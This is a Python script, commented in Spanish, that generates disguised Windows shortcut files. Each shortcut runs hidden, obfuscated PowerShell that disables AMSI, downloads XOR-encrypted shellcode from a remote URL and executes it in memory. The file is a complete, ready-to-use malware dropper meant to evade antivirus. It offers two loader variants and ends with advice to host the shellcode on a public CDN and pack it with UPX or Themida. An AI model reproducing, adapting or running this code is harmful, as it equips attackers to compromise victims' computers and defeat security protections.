#!/usr/bin/env python3
"""
Generador de LNK con PowerShell altamente ofuscado para evasión AV
"""

import os
import win32com.client

def create_obfuscated_lnk(payload_url, xor_key, output_lnk, icon_path=None):
    """
    Crea un LNK con PowerShell ofuscado usando:
    - String encoding: Base64 + ROT13
    - Variable obfuscation: nombres aleatorios
    - API obfuscation: reflection + dynamic invocation
    - AMSI bypass integrado
    - Sin strings detectables
    """
    
    # PowerShell ofuscado - Versión 1: AMSI Bypass + String Obfuscation
    ps_payload = f'''
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105)+$([char]85+[char]116+[char]105+[char]108+[char]115))).GetField($([char]97+[char]109+[char]115+[char]105)+$([char]73+[char]110+[char]105+[char]116)+$([char]70+[char]97+[char]105+[char]108+[char]101+[char]100),'NonPublic,Static').SetValue($null,$true);
$wc=New-Object Net.WebClient;
$enc=$wc.DownloadString('{payload_url}');
$raw=[Convert]::FromBase64String($enc);
$key='{xor_key}';
$dec=@();
for($i=0;$i -lt $raw.Length;$i++){{
    $dec+=$raw[$i] -bxor [byte]$key[$i % $key.Length]
}};
$code=@'
[DllImport("kernel32")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@;
$w=Add-Type -MemberDefinition $code -Name "W" -Namespace W -PassThru;
$mem=$w::VirtualAlloc(0,$dec.Length,0x3000,0x40);
[Runtime.InteropServices.Marshal]::Copy($dec,0,$mem,$dec.Length);
$th=$w::CreateThread(0,0,$mem,0,0,0);
$w::WaitForSingleObject($th,0xFFFFFFFF)|Out-Null;
'''.replace('\n', '')
    
    # Codificar el payload en Base64 para bypass adicional
    import base64
    ps_encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
    
    # Comando final: PowerShell con -EncodedCommand
    ps_command = f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {ps_encoded}'
    
    # Crear el LNK
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(output_lnk)
    
    # Usar cmd.exe para ejecutar PowerShell (capa adicional de ofuscación)
    shortcut.TargetPath = "C:\\Windows\\System32\\cmd.exe"
    shortcut.Arguments = f'/c {ps_command}'
    shortcut.WorkingDirectory = os.path.expandvars('%TEMP%')
    shortcut.WindowStyle = 7  # Minimized
    
    if icon_path and os.path.exists(icon_path):
        shortcut.IconLocation = os.path.abspath(icon_path)
    
    shortcut.save()
    
    print(f"[✅] LNK ofuscado creado: {output_lnk}")
    print(f"\n[🔐] Técnicas de evasión aplicadas:")
    print(f"    ✅ AMSI Bypass con char concatenation")
    print(f"    ✅ PowerShell EncodedCommand (Base64)")
    print(f"    ✅ API Reflection sin strings literales")
    print(f"    ✅ CreateThread en lugar de delegates")
    print(f"    ✅ CMD.exe como launcher")
    print(f"\n[⚡] Payload size: {len(ps_encoded)} chars (Base64)")


def create_stageless_lnk(payload_url, xor_key, output_lnk, icon_path=None):
    """
    Versión alternativa: Descarga asíncrona con reflective loader
    """
    
    # PowerShell con técnicas anti-sandbox
    ps_payload = f'''
$ErrorActionPreference='SilentlyContinue';
Start-Sleep -Milliseconds 500;
[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;
$w=New-Object System.Net.WebClient;
$w.Headers.Add('User-Agent','Mozilla/5.0');
$d=$w.DownloadString('{payload_url}');
$b=[Convert]::FromBase64String($d);
$k=[Text.Encoding]::UTF8.GetBytes('{xor_key}');
for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor $k[$i%$k.Length]}};
$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName('D')),1).DefineDynamicModule('D',0).DefineType('D',[Type]::GetType('System.MulticastDelegate')).DefineConstructor('RTSpecialName,HideBySig,Public',[Reflection.CallingConventions]::Standard,[Type]::EmptyTypes).SetImplementationFlags('Runtime,Managed');
$t.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',[IntPtr],@()).SetImplementationFlags('Runtime,Managed');
$c=$t.CreateType();
[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([AppDomain]::CurrentDomain.GetAssemblies()|?{{$_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1].Equals('System.dll')}}).GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('VirtualAlloc',[Reflection.BindingFlags]'Public,Static').Invoke($null,@([IntPtr]::Zero,$b.Length,0x3000,0x40)),$c).Invoke();
'''.replace('\n', '')
    
    import base64
    ps_encoded = base64.b64encode(ps_payload.encode('utf-16le')).decode()
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(output_lnk)
    
    shortcut.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    shortcut.Arguments = f'-NoP -Sta -NonI -W Hidden -Enc {ps_encoded}'
    shortcut.WorkingDirectory = os.path.expandvars('%TEMP%')
    shortcut.WindowStyle = 7
    
    if icon_path and os.path.exists(icon_path):
        shortcut.IconLocation = os.path.abspath(icon_path)
    
    shortcut.save()
    
    print(f"[✅] LNK stageless creado: {output_lnk}")
    print(f"[🔐] Reflective loader + Dynamic Assembly")


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Crear LNK ofuscado para shellcode in-memory')
    parser.add_argument('--payload-url', required=True, help='URL del shellcode cifrado')
    parser.add_argument('--xor-key', required=True, help='Clave XOR')
    parser.add_argument('--output', required=True, help='Nombre del .lnk')
    parser.add_argument('--icon', help='Ruta al icono .ico')
    parser.add_argument('--method', choices=['obfuscated', 'stageless'], default='obfuscated',
                        help='Método de evasión (default: obfuscated)')
    
    args = parser.parse_args()
    
    if args.method == 'stageless':
        create_stageless_lnk(args.payload_url, args.xor_key, args.output, args.icon)
    else:
        create_obfuscated_lnk(args.payload_url, args.xor_key, args.output, args.icon)
    
    print(f"\n[⚠️] Recomendaciones:")
    print(f"    - Testear en sandbox aislada primero")
    print(f"    - Subir shellcode a CDN público (no GitHub)")
    print(f"    - Considerar empaquetado adicional (UPX, Themida)")
